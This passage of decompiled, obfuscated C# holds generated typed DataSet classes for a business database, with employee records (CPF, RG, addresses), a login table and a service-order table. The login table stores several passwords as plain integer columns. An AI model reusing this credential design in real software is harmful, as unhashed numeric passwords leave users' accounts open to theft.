					null, NOME_FUNCIONARIO, TIPO_FUNCIONARIO, APELIDO, ENDERECO, BAIRRO, CIDADE, UF, CEP, TEL_CEL,
					TEL_RES, COMPLEMENTO, DAT_NASC, DAT_ADMISAO, EMAIL, FACEBOOK, CPF, RG, CNPJ, INS,
					EMISSOR, COMISAO, OBSERVACAO
				};
				tB_FUNCIONARIOSRow.ItemArray = itemArray;
				base.Rows.Add(tB_FUNCIONARIOSRow);
				return tB_FUNCIONARIOSRow;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_FUNCIONARIOSRow FindByCódigo(int Código)
			{
				return (TB_FUNCIONARIOSRow)base.Rows.Find(new object[1] { Código });
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public virtual IEnumerator GetEnumerator()
			{
				return base.Rows.GetEnumerator();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public override DataTable Clone()
			{
				TB_FUNCIONARIOSDataTable tB_FUNCIONARIOSDataTable = (TB_FUNCIONARIOSDataTable)base.Clone();
				tB_FUNCIONARIOSDataTable.InitVars();
				return tB_FUNCIONARIOSDataTable;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override DataTable CreateInstance()
			{
				return new TB_FUNCIONARIOSDataTable();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal void InitVars()
			{
				columnCódigo = base.Columns[\u0004.\u0001.\u0001(2290)];
				columnNOME_FUNCIONARIO = base.Columns[\u0004.\u0001.\u0001(3848)];
				columnTIPO_FUNCIONARIO = base.Columns[\u0004.\u0001.\u0001(3884)];
				columnAPELIDO = base.Columns[\u0004.\u0001.\u0001(2326)];
				columnENDERECO = base.Columns[\u0004.\u0001.\u0001(2344)];
				columnBAIRRO = base.Columns[\u0004.\u0001.\u0001(2614)];
				columnCIDADE = base.Columns[\u0004.\u0001.\u0001(2364)];
				columnUF = base.Columns[\u0004.\u0001.\u0001(2380)];
				columnCEP = base.Columns[\u0004.\u0001.\u0001(2388)];
				columnTEL_CEL = base.Columns[\u0004.\u0001.\u0001(2398)];
				columnTEL_RES = base.Columns[\u0004.\u0001.\u0001(2416)];
				columnCOMPLEMENTO = base.Columns[\u0004.\u0001.\u0001(2434)];
				columnDAT_NASC = base.Columns[\u0004.\u0001.\u0001(2460)];
				columnDAT_ADMISAO = base.Columns[\u0004.\u0001.\u0001(3920)];
				columnEMAIL = base.Columns[\u0004.\u0001.\u0001(2498)];
				columnFACEBOOK = base.Columns[\u0004.\u0001.\u0001(2512)];
				columnCPF = base.Columns[\u0004.\u0001.\u0001(2572)];
				columnRG = base.Columns[\u0004.\u0001.\u0001(2582)];
				columnCNPJ = base.Columns[\u0004.\u0001.\u0001(2550)];
				columnINS = base.Columns[\u0004.\u0001.\u0001(2562)];
				columnEMISSOR = base.Columns[\u0004.\u0001.\u0001(3738)];
				columnCOMISAO = base.Columns[\u0004.\u0001.\u0001(3946)];
				columnOBSERVACAO = base.Columns[\u0004.\u0001.\u0001(2590)];
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			private void InitClass()
			{
				columnCódigo = new DataColumn(\u0004.\u0001.\u0001(2290), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnCódigo);
				columnNOME_FUNCIONARIO = new DataColumn(\u0004.\u0001.\u0001(3848), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnNOME_FUNCIONARIO);
				columnTIPO_FUNCIONARIO = new DataColumn(\u0004.\u0001.\u0001(3884), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnTIPO_FUNCIONARIO);
				columnAPELIDO = new DataColumn(\u0004.\u0001.\u0001(2326), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnAPELIDO);
				columnENDERECO = new DataColumn(\u0004.\u0001.\u0001(2344), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnENDERECO);
				columnBAIRRO = new DataColumn(\u0004.\u0001.\u0001(2614), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnBAIRRO);
				columnCIDADE = new DataColumn(\u0004.\u0001.\u0001(2364), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCIDADE);
				columnUF = new DataColumn(\u0004.\u0001.\u0001(2380), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnUF);
				columnCEP = new DataColumn(\u0004.\u0001.\u0001(2388), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnCEP);
				columnTEL_CEL = new DataColumn(\u0004.\u0001.\u0001(2398), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnTEL_CEL);
				columnTEL_RES = new DataColumn(\u0004.\u0001.\u0001(2416), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnTEL_RES);
				columnCOMPLEMENTO = new DataColumn(\u0004.\u0001.\u0001(2434), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCOMPLEMENTO);
				columnDAT_NASC = new DataColumn(\u0004.\u0001.\u0001(2460), typeof(DateTime), null, MappingType.Element);
				base.Columns.Add(columnDAT_NASC);
				columnDAT_ADMISAO = new DataColumn(\u0004.\u0001.\u0001(3920), typeof(DateTime), null, MappingType.Element);
				base.Columns.Add(columnDAT_ADMISAO);
				columnEMAIL = new DataColumn(\u0004.\u0001.\u0001(2498), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnEMAIL);
				columnFACEBOOK = new DataColumn(\u0004.\u0001.\u0001(2512), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnFACEBOOK);
				columnCPF = new DataColumn(\u0004.\u0001.\u0001(2572), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnCPF);
				columnRG = new DataColumn(\u0004.\u0001.\u0001(2582), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnRG);
				columnCNPJ = new DataColumn(\u0004.\u0001.\u0001(2550), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnCNPJ);
				columnINS = new DataColumn(\u0004.\u0001.\u0001(2562), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnINS);
				columnEMISSOR = new DataColumn(\u0004.\u0001.\u0001(3738), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnEMISSOR);
				columnCOMISAO = new DataColumn(\u0004.\u0001.\u0001(3946), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnCOMISAO);
				columnOBSERVACAO = new DataColumn(\u0004.\u0001.\u0001(2590), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnOBSERVACAO);
				base.Constraints.Add(new UniqueConstraint(\u0004.\u0001.\u0001(2650), new DataColumn[1] { columnCódigo }, isPrimaryKey: true));
				columnCódigo.AutoIncrement = true;
				columnCódigo.AutoIncrementSeed = -1L;
				columnCódigo.AutoIncrementStep = -1L;
				columnCódigo.AllowDBNull = false;
				columnCódigo.Unique = true;
				columnNOME_FUNCIONARIO.MaxLength = 50;
				columnTIPO_FUNCIONARIO.MaxLength = 25;
				columnAPELIDO.MaxLength = 25;
				columnENDERECO.MaxLength = 30;
				columnBAIRRO.MaxLength = 30;
				columnCIDADE.MaxLength = 40;
				columnUF.MaxLength = 2;
				columnCOMPLEMENTO.MaxLength = 150;
				columnEMAIL.MaxLength = 50;
				columnFACEBOOK.MaxLength = 50;
				columnEMISSOR.MaxLength = 3;
				columnOBSERVACAO.MaxLength = 150;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_FUNCIONARIOSRow NewTB_FUNCIONARIOSRow()
			{
				return (TB_FUNCIONARIOSRow)NewRow();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override DataRow NewRowFromBuilder(DataRowBuilder builder)
			{
				return new TB_FUNCIONARIOSRow(builder);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override Type GetRowType()
			{
				return typeof(TB_FUNCIONARIOSRow);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void RemoveTB_FUNCIONARIOSRow(TB_FUNCIONARIOSRow row)
			{
				base.Rows.Remove(row);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public static XmlSchemaComplexType GetTypedTableSchema(XmlSchemaSet xs)
			{
				//IL_0001: Unknown result type (might be due to invalid IL or missing references)
				//IL_0007: Expected O, but got Unknown
				//IL_0007: Unknown result type (might be due to invalid IL or missing references)
				//IL_000d: Expected O, but got Unknown
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_0019: Expected O, but got Unknown
				//IL_005c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0063: Expected O, but got Unknown
				//IL_009f: Unknown result type (might be due to invalid IL or missing references)
				//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
				//IL_00c7: Expected O, but got Unknown
				//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
				//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
				//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00fa: Expected O, but got Unknown
				//IL_015c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0163: Expected O, but got Unknown
				XmlSchemaComplexType val = new XmlSchemaComplexType();
				XmlSchemaSequence val2 = new XmlSchemaSequence();
				BD_AUTOMCAODataSet bD_AUTOMCAODataSet = new BD_AUTOMCAODataSet();
				XmlSchemaAny val3 = new XmlSchemaAny();
				val3.Namespace = \u0004.\u0001.\u0001(2676);
				((XmlSchemaParticle)val3).MinOccurs = 0m;
				((XmlSchemaParticle)val3).MaxOccurs = decimal.MaxValue;
				val3.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val3);
				XmlSchemaAny val4 = new XmlSchemaAny();
				val4.Namespace = \u0004.\u0001.\u0001(2744);
				((XmlSchemaParticle)val4).MinOccurs = 1m;
				val4.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val4);
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2830),
					FixedValue = bD_AUTOMCAODataSet.Namespace
				});
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2852),
					FixedValue = \u0004.\u0001.\u0001(3964)
				});
				val.Particle = (XmlSchemaParticle)(object)val2;
				XmlSchema schemaSerializable = bD_AUTOMCAODataSet.GetSchemaSerializable();
				if (xs.Contains(schemaSerializable.TargetNamespace))
				{
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = new MemoryStream();
					try
					{
						schemaSerializable.Write((Stream)memoryStream);
						IEnumerator enumerator = xs.Schemas(schemaSerializable.TargetNamespace).GetEnumerator();
						while (enumerator.MoveNext())
						{
							XmlSchema val5 = (XmlSchema)enumerator.Current;
							memoryStream2.SetLength(0L);
							val5.Write((Stream)memoryStream2);
							if (memoryStream.Length == memoryStream2.Length)
							{
								memoryStream.Position = 0L;
								memoryStream2.Position = 0L;
								while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
								{
								}
								if (memoryStream.Position == memoryStream.Length)
								{
									return val;
								}
							}
						}
					}
					finally
					{
						memoryStream?.Close();
						memoryStream2?.Close();
					}
				}
				xs.Add(schemaSerializable);
				return val;
			}
		}

		[Serializable]
		[XmlSchemaProvider("GetTypedTableSchema")]
		public class TB_LOGINDataTable : DataTable, IEnumerable
		{
			private DataColumn columnCódigo;

			private DataColumn columnFUNCIONARIO;

			private DataColumn columnSENHA;

			private DataColumn columnGERENTE;

			private DataColumn columnSENHA1;

			private DataColumn columnPRESIDENTE;

			private DataColumn columnSENHA2;

			private DataColumn columnSUPERVISOR;

			private DataColumn columnSENHA3;

			private DataColumn columnSUB_GERENTE;

			private DataColumn columnSENHA4;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn CódigoColumn => columnCódigo;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn FUNCIONARIOColumn => columnFUNCIONARIO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn SENHAColumn => columnSENHA;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn GERENTEColumn => columnGERENTE;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn SENHA1Column => columnSENHA1;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn PRESIDENTEColumn => columnPRESIDENTE;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn SENHA2Column => columnSENHA2;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn SUPERVISORColumn => columnSUPERVISOR;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn SENHA3Column => columnSENHA3;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn SUB_GERENTEColumn => columnSUB_GERENTE;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn SENHA4Column => columnSENHA4;

			[Browsable(false)]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public int Count => base.Rows.Count;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_LOGINRow this[int index] => (TB_LOGINRow)base.Rows[index];

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_LOGINRowChangeEventHandler TB_LOGINRowChanging;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_LOGINRowChangeEventHandler TB_LOGINRowChanged;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_LOGINRowChangeEventHandler TB_LOGINRowDeleting;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_LOGINRowChangeEventHandler TB_LOGINRowDeleted;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_LOGINDataTable()
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = \u0004.\u0001.\u0001(1470);
				BeginInit();
				InitClass();
				EndInit();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_LOGINDataTable(DataTable table)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = table.TableName;
				if (table.CaseSensitive != table.DataSet.CaseSensitive)
				{
					base.CaseSensitive = table.CaseSensitive;
				}
				if (Operators.CompareString(table.Locale.ToString(), table.DataSet.Locale.ToString(), false) != 0)
				{
					base.Locale = table.Locale;
				}
				if (Operators.CompareString(table.Namespace, table.DataSet.Namespace, false) != 0)
				{
					base.Namespace = table.Namespace;
				}
				base.Prefix = table.Prefix;
				base.MinimumCapacity = table.MinimumCapacity;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected TB_LOGINDataTable(SerializationInfo info, StreamingContext context)
			{
				\u0008.\u0002.\u0001();
				base..ctor(info, context);
				InitVars();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void AddTB_LOGINRow(TB_LOGINRow row)
			{
				base.Rows.Add(row);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_LOGINRow AddTB_LOGINRow(string FUNCIONARIO, int SENHA, string GERENTE, int SENHA1, string PRESIDENTE, int SENHA2, string SUPERVISOR, int SENHA3, string SUB_GERENTE, int SENHA4)
			{
				TB_LOGINRow tB_LOGINRow = (TB_LOGINRow)NewRow();
				object[] itemArray = new object[11]
				{
					null, FUNCIONARIO, SENHA, GERENTE, SENHA1, PRESIDENTE, SENHA2, SUPERVISOR, SENHA3, SUB_GERENTE,
					SENHA4
				};
				tB_LOGINRow.ItemArray = itemArray;
				base.Rows.Add(tB_LOGINRow);
				return tB_LOGINRow;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_LOGINRow FindByCódigo(int Código)
			{
				return (TB_LOGINRow)base.Rows.Find(new object[1] { Código });
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public virtual IEnumerator GetEnumerator()
			{
				return base.Rows.GetEnumerator();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public override DataTable Clone()
			{
				TB_LOGINDataTable tB_LOGINDataTable = (TB_LOGINDataTable)base.Clone();
				tB_LOGINDataTable.InitVars();
				return tB_LOGINDataTable;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override DataTable CreateInstance()
			{
				return new TB_LOGINDataTable();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal void InitVars()
			{
				columnCódigo = base.Columns[\u0004.\u0001.\u0001(2290)];
				columnFUNCIONARIO = base.Columns[\u0004.\u0001.\u0001(4016)];
				columnSENHA = base.Columns[\u0004.\u0001.\u0001(4042)];
				columnGERENTE = base.Columns[\u0004.\u0001.\u0001(4056)];
				columnSENHA1 = base.Columns[\u0004.\u0001.\u0001(4074)];
				columnPRESIDENTE = base.Columns[\u0004.\u0001.\u0001(4090)];
				columnSENHA2 = base.Columns[\u0004.\u0001.\u0001(4114)];
				columnSUPERVISOR = base.Columns[\u0004.\u0001.\u0001(4130)];
				columnSENHA3 = base.Columns[\u0004.\u0001.\u0001(4154)];
				columnSUB_GERENTE = base.Columns[\u0004.\u0001.\u0001(4170)];
				columnSENHA4 = base.Columns[\u0004.\u0001.\u0001(4196)];
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			private void InitClass()
			{
				columnCódigo = new DataColumn(\u0004.\u0001.\u0001(2290), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnCódigo);
				columnFUNCIONARIO = new DataColumn(\u0004.\u0001.\u0001(4016), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnFUNCIONARIO);
				columnSENHA = new DataColumn(\u0004.\u0001.\u0001(4042), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnSENHA);
				columnGERENTE = new DataColumn(\u0004.\u0001.\u0001(4056), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnGERENTE);
				columnSENHA1 = new DataColumn(\u0004.\u0001.\u0001(4074), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnSENHA1);
				columnPRESIDENTE = new DataColumn(\u0004.\u0001.\u0001(4090), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnPRESIDENTE);
				columnSENHA2 = new DataColumn(\u0004.\u0001.\u0001(4114), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnSENHA2);
				columnSUPERVISOR = new DataColumn(\u0004.\u0001.\u0001(4130), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnSUPERVISOR);
				columnSENHA3 = new DataColumn(\u0004.\u0001.\u0001(4154), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnSENHA3);
				columnSUB_GERENTE = new DataColumn(\u0004.\u0001.\u0001(4170), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnSUB_GERENTE);
				columnSENHA4 = new DataColumn(\u0004.\u0001.\u0001(4196), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnSENHA4);
				base.Constraints.Add(new UniqueConstraint(\u0004.\u0001.\u0001(2650), new DataColumn[1] { columnCódigo }, isPrimaryKey: true));
				columnCódigo.AutoIncrement = true;
				columnCódigo.AutoIncrementSeed = -1L;
				columnCódigo.AutoIncrementStep = -1L;
				columnCódigo.AllowDBNull = false;
				columnCódigo.Unique = true;
				columnFUNCIONARIO.MaxLength = 50;
				columnGERENTE.MaxLength = 50;
				columnPRESIDENTE.MaxLength = 50;
				columnSUPERVISOR.MaxLength = 50;
				columnSUB_GERENTE.MaxLength = 50;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_LOGINRow NewTB_LOGINRow()
			{
				return (TB_LOGINRow)NewRow();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override DataRow NewRowFromBuilder(DataRowBuilder builder)
			{
				return new TB_LOGINRow(builder);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override Type GetRowType()
			{
				return typeof(TB_LOGINRow);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void RemoveTB_LOGINRow(TB_LOGINRow row)
			{
				base.Rows.Remove(row);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public static XmlSchemaComplexType GetTypedTableSchema(XmlSchemaSet xs)
			{
				//IL_0001: Unknown result type (might be due to invalid IL or missing references)
				//IL_0007: Expected O, but got Unknown
				//IL_0007: Unknown result type (might be due to invalid IL or missing references)
				//IL_000d: Expected O, but got Unknown
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_0019: Expected O, but got Unknown
				//IL_005c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0063: Expected O, but got Unknown
				//IL_009f: Unknown result type (might be due to invalid IL or missing references)
				//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
				//IL_00c7: Expected O, but got Unknown
				//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
				//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
				//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00fa: Expected O, but got Unknown
				//IL_015c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0163: Expected O, but got Unknown
				XmlSchemaComplexType val = new XmlSchemaComplexType();
				XmlSchemaSequence val2 = new XmlSchemaSequence();
				BD_AUTOMCAODataSet bD_AUTOMCAODataSet = new BD_AUTOMCAODataSet();
				XmlSchemaAny val3 = new XmlSchemaAny();
				val3.Namespace = \u0004.\u0001.\u0001(2676);
				((XmlSchemaParticle)val3).MinOccurs = 0m;
				((XmlSchemaParticle)val3).MaxOccurs = decimal.MaxValue;
				val3.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val3);
				XmlSchemaAny val4 = new XmlSchemaAny();
				val4.Namespace = \u0004.\u0001.\u0001(2744);
				((XmlSchemaParticle)val4).MinOccurs = 1m;
				val4.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val4);
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2830),
					FixedValue = bD_AUTOMCAODataSet.Namespace
				});
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2852),
					FixedValue = \u0004.\u0001.\u0001(4212)
				});
				val.Particle = (XmlSchemaParticle)(object)val2;
				XmlSchema schemaSerializable = bD_AUTOMCAODataSet.GetSchemaSerializable();
				if (xs.Contains(schemaSerializable.TargetNamespace))
				{
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = new MemoryStream();
					try
					{
						schemaSerializable.Write((Stream)memoryStream);
						IEnumerator enumerator = xs.Schemas(schemaSerializable.TargetNamespace).GetEnumerator();
						while (enumerator.MoveNext())
						{
							XmlSchema val5 = (XmlSchema)enumerator.Current;
							memoryStream2.SetLength(0L);
							val5.Write((Stream)memoryStream2);
							if (memoryStream.Length == memoryStream2.Length)
							{
								memoryStream.Position = 0L;
								memoryStream2.Position = 0L;
								while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
								{
								}
								if (memoryStream.Position == memoryStream.Length)
								{
									return val;
								}
							}
						}
					}
					finally
					{
						memoryStream?.Close();
						memoryStream2?.Close();
					}
				}
				xs.Add(schemaSerializable);
				return val;
			}
		}

		[Serializable]
		[XmlSchemaProvider("GetTypedTableSchema")]
		public class TB_ORDEMSERVICODataTable : DataTable, IEnumerable
		{
			private DataColumn columnNUM_ORDEM;

			private DataColumn columnNOME_CLI;

			private DataColumn columnCONTA_CLI;

			private DataColumn columnTEL_CONTATO;

			private DataColumn columnAPARELHO;

			private DataColumn columnMARCA;

			private DataColumn columnMODELO;

			private DataColumn columnNUM_SERIE;

			private DataColumn columnACESSORIO;

			private DataColumn columnMARCAS_USO;

			private DataColumn columnDEFEITO;

			private DataColumn columnSERVICO_EXECUTADO;

			private DataColumn columnDATA_ENTRADA;

			private DataColumn columnDATA_SAIDA;

			private DataColumn columnOBSERVACAO;

			private DataColumn columnPARTE_DANIFICADA;

			private DataColumn columnTEL_FIXO;

			private DataColumn columnPRECO_SERVICO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn NUM_ORDEMColumn => columnNUM_ORDEM;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn NOME_CLIColumn => columnNOME_CLI;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CONTA_CLIColumn => columnCONTA_CLI;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn TEL_CONTATOColumn => columnTEL_CONTATO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn APARELHOColumn => columnAPARELHO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn MARCAColumn => columnMARCA;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn MODELOColumn => columnMODELO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn NUM_SERIEColumn => columnNUM_SERIE;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn ACESSORIOColumn => columnACESSORIO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn MARCAS_USOColumn => columnMARCAS_USO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn DEFEITOColumn => columnDEFEITO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn SERVICO_EXECUTADOColumn => columnSERVICO_EXECUTADO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn DATA_ENTRADAColumn => columnDATA_ENTRADA;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn DATA_SAIDAColumn => columnDATA_SAIDA;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn OBSERVACAOColumn => columnOBSERVACAO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn PARTE_DANIFICADAColumn => columnPARTE_DANIFICADA;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn TEL_FIXOColumn => columnTEL_FIXO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn PRECO_SERVICOColumn => columnPRECO_SERVICO;

			[DebuggerNonUserCode]
			[Browsable(false)]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int Count => base.Rows.Count;

